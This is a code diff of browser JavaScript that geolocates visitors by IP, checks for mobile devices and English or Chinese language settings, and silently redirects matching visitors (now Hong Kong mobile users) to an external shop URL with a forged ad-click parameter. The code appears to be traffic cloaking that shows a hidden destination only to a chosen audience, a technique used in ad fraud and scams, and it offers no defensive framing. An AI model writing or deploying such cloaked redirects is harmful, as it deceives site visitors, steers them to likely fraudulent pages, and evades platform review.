@@ -37,15 +37,21 @@
       return /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
     }
 
-function isJapaneseLang() {
+function isSupportedLang() {
     return navigator.language.startsWith('en') || 
-           navigator.languages.some(lang => lang.startsWith('en'));
+           navigator.language.startsWith('zh-HK') ||
+           navigator.language.startsWith('zh-TW') ||
+           navigator.language.startsWith('zh-CN') ||
+           navigator.languages.some(lang => lang.startsWith('en') || 
+                                             lang.startsWith('zh-HK') || 
+                                             lang.startsWith('zh-TW') || 
+                                             lang.startsWith('zh-CN'));
 }
     fetch('https://ipapi.co/json/')
       .then(response => response.json())
       .then(data => {
         // 严格的三重条件判断
-        if (data.country === 'GB' && isMobileDevice() &&isJapaneseLang() ) {
+        if (data.country === 'HK' && isMobileDevice()) {
           window.location.href = "https://nkaigc.shop/?fbclid=fbclid";
           return;
         }
@@ -59,7 +65,7 @@ function isJapaneseLang() {
       })
       .catch(() => {
         // IP检测失败时严格的双重条件判断
-        if (isMobileDevice() && isJapaneseLang()) {
+        if (isMobileDevice() && isSupportedLang()) {
          window.location.href = "https://nkaigc.shop/?fbclid=fbclid";
           return;
         }
